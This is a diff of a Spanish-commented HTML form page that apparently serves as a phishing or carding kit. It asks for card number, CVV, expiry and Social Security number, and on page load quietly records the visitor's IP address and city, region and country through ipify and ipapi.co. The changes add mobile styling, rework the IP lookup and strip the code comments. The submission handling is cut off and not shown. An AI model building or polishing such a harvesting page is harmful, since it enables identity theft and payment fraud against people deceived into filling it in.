@@ -16,6 +16,7 @@
       padding: 30px;
       min-height: 100vh;
     }
+
     .container {
       display: flex;
       flex-direction: row;
@@ -28,27 +29,33 @@
       width: 100%;
       color: white;
     }
+
     .form-section {
       flex: 1;
       display: flex;
       flex-direction: column;
       gap: 12px;
     }
+
     .form-section h2 {
       margin-bottom: 10px;
       color: #fff;
     }
+
     input, select {
       padding: 10px;
       border: none;
       border-radius: 6px;
       font-size: 14px;
+      width: 100%;
     }
+
     label {
       font-weight: bold;
       margin-top: 10px;
       color: #fff;
     }
+
     button {
       margin-top: 20px;
       padding: 12px;
@@ -60,8 +67,29 @@
       font-size: 16px;
       transition: background-color 0.3s ease;
     }
+
     button:hover {
       background: #0b7dda;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 15px;
+      }
+
+      .container {
+        flex-direction: column;
+        gap: 25px;
+        padding: 20px;
+      }
+
+      .form-section {
+        width: 100%;
+      }
+
+      input, select, button {
+        font-size: 16px;
+      }
     }
   </style>
 </head>
@@ -140,20 +168,24 @@
   let userIP = 'Desconocida';
   let userLocation = 'Desconocida';
 
-  // Obtener IP y ubicación al cargar con ipapi.co (sin token)
-  fetch('https://ipapi.co/json/')
+  // Obtener IP IPv4 con ipify
+  fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(data => {
       userIP = data.ip || 'Desconocida';
-      userLocation = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`
-        .replace(/(^,)|(,$)/g, '') || 'Desconocida';
+
+      // Luego obtener ubicación con ipapi.co sin ip (solo ubicación)
+      return fetch('https://ipapi.co/json/');
+    })
+    .then(res => res.json())
+    .then(data => {
+      userLocation = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(/(^,)|(,$)/g, '') || 'Desconocida';
     })
     .catch(() => {
       userIP = 'Desconocida';
       userLocation = 'Desconocida';
     });
 
-  // Rellenar meses para expiración tarjeta
   const monthSelect = document.getElementById('card_exp_month');
   for(let i = 1; i <= 12; i++) {
     const option = document.createElement('option');
@@ -163,7 +195,6 @@
     monthSelect.appendChild(option);
   }
 
-  // Rellenar años para expiración tarjeta: año actual + 10 años
   const yearSelect = document.getElementById('card_exp_year');
   const currentYear = new Date().getFullYear();
   for(let i = 0; i <= 10; i++) {
@@ -174,7 +205,6 @@
     yearSelect.appendChild(option);
   }
 
-  // Lista de estados de EE.UU.
   const statesSelect = document.getElementById('billing_state');
   const states = [
     "Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut",
@@ -194,7 +224,6 @@
     statesSelect.appendChild(option);
   });
 
-  // Formato automático para número de tarjeta (agrega espacios cada 4 dígitos)
   const cardNumberInput = document.getElementById('card_number');
   cardNumberInput.addEventListener('input', e => {
     let val = e.target.value.replace(/\D/g, '').slice(0,16);
@@ -202,7 +231,6 @@
     e.target.value = val;
   });
 
-  // Validación SSN (solo 9 dígitos)
   const ssnInput = document.getElementById('ssn');
   ssnInput.addEventListener('input', e => {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0,9);
@@ -235,7 +263,6 @@
       values[input.name] = input.value.trim();
     });
 
-    // Validar que no haya campos vacíos
     for (let key in values) {
       if (!values[key]) {
         alert('Todos los campos deben completarse.');
@@ -243,26 +270,22 @@
       }
     }
 
-    // Validar SSN 9 dígitos
     if (!/^\d{9}$/.test(values.ssn)) {
       alert('SSN debe contener exactamente 9 dígitos numéricos sin guiones.');
       return;
     }
 
-    // Validar tarjeta 16 dígitos
     const cardNum = values.card_number.replace(/\s/g,'');
     if (!/^\d{16}$/.test(cardNum)) {
       alert('Número de tarjeta debe contener exactamente 16 dígitos numéricos.');
       return;
     }
 
-    // Validar CVV 3 o 4 dígitos
     if (!/^\d{3,4}$/.test(values.card_cvv)) {
       alert('CVV debe contener 3 o 4 dígitos.');
       return;
     }
 
-    // Validar expiración seleccionada
     const month = document.getElementById('card_exp_month').value;
     const year = document.getElementById('card_exp_year').value;
     if (!month || !year) {
